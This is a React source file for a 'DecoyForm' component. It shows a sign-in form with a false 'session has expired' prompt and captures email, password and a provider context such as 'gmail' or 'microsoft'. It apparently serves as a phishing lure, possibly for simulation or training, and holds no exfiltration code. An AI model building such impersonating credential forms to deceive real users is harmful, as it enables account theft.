import { useState } from 'react';

export interface DecoyCredentials {
  email: string;
  password: string;
  context: string; // e.g., 'gmail', 'microsoft'
}

interface DecoyFormProps {
  context?: string;
  onSubmit: (data: DecoyCredentials) => void;
  isLoading?: boolean;
}

export default function DecoyForm({
  context = 'generic',
  onSubmit,
  isLoading = false,
}: DecoyFormProps) {
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    onSubmit({ email, password, context });
  };

  return (
    <form
      onSubmit={handleSubmit}
      className="w-full max-w-md mx-auto p-6 space-y-4"
      aria-labelledby="decoy-form-title"
    >
      <div className="text-center">
        <h2 id="decoy-form-title" className="text-xl font-semibold text-gray-800 dark:text-gray-200">
          Sign in to continue
        </h2>
        <p className="text-sm text-gray-500 dark:text-gray-400 mt-1">
          Your session has expired. Please re-authenticate.
        </p>
      </div>

      <div className="space-y-3">
        <div>
          <label htmlFor="email" className="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-1">
            Email or phone
          </label>
          <input
            id="email"
            type="email"
            value={email}
            onChange={(e) => setEmail(e.target.value)}
            required
            autoComplete="email"
            className="w-full px-4 py-2.5 rounded-lg border border-gray-300 dark:border-gray-600 
                     bg-white dark:bg-gray-800 text-gray-900 dark:text-white 
                     focus:ring-2 focus:ring-indigo-500 focus:border-transparent 
                     transition-shadow"
            aria-describedby="email-error"
          />
        </div>

        <div>
          <label htmlFor="password" className="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-1">
            Password
          </label>
          <input
            id="password"
            type="password"
            value={password}
            onChange={(e) => setPassword(e.target.value)}
            required
            autoComplete="current-password"
            className="w-full px-4 py-2.5 rounded-lg border border-gray-300 dark:border-gray-600 
                     bg-white dark:bg-gray-800 text-gray-900 dark:text-white 
                     focus:ring-2 focus:ring-indigo-500 focus:border-transparent 
                     transition-shadow"
          />
        </div>

        <button
          type="submit"
          disabled={isLoading}
          className={`w-full py-2.5 px-4 rounded-lg font-medium text-white 
                    transition-all duration-200 ${
                      isLoading
                        ? 'bg-indigo-400 cursor-not-allowed'
                        : 'bg-indigo-600 hover:bg-indigo-700 active:scale-[0.98]'
                    } 
                    shadow-md hover:shadow-lg`}
        >
          {isLoading ? 'Verifying...' : 'Next'}
        </button>
      </div>

      <div className="text-center mt-4">
        <a
          href="#"
          className="text-sm text-indigo-600 hover:text-indigo-800 dark:text-indigo-400 dark:hover:text-indigo-300"
        >
          Forgot password?
        </a>
      </div>
    </form>
  );
}